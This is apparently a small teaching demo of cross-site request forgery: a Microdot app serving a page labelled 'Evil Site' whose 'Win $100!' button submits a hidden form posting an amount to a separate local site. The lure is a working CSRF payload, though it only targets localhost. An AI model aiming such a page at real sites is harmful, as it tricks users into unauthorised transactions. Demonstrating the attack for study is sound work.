from microdot import Microdot

app = Microdot()


@app.route('/', methods=['GET', 'POST'])
def index(request):
    page = '''<!doctype html>
<html>
  <head>
    <title>CSRF Example</title>
  </head>
  <body>
    <h1>Evil Site</h1>
    <form method="POST" action="http://localhost:5000">
      <input type="hidden" name="amount" value="100" />
      <input type="submit" value="Win $100!" />
    </form>
  </body>
</html>'''
    return page, {'Content-Type': 'text/html'}


if __name__ == '__main__':
    app.run(port=5001, debug=True)
